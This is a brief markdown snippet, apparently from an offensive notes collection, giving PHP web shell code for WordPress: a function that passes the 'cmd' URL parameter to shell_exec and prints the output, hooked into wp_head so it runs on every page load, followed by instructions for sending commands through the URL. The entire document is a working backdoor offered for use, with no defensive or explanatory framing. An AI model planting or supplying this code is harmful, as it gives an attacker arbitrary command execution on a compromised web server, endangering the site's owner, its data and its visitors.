# .php Webshell Code

```
function webshell(){
	echo shell_exec($_GET['cmd']);
}

add_action('wp_head', 'webshell');
```

run commands with:
```
[URL]/?cmd=[COMMAND]
```
*Ensure commands are url encoded*
